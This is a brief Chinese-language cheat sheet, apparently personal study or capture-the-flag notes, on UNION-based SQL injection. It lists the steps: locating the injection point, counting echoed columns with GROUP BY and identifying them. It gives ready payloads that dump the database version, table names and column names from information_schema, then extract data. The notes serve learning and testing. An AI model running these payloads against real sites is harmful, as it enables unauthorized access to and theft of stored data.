### SQL注入总结

- 第一步, 检查注入点
- 第二步, group by 查看前端回显字段数量
- 第三步, `union select 1,2,3,4` 根据前端显示判定回显字段
- 第二步, 注意闭合
- 注入代码:
    - `union select version(),database()`
    - `union select group_concat(table_name) from information_schema.tables where table_schema=database()`
    - `union select group_concat(column_name) from information_schema.columns where table_name='table_name'`
- 根据列名查询数据, 注意limit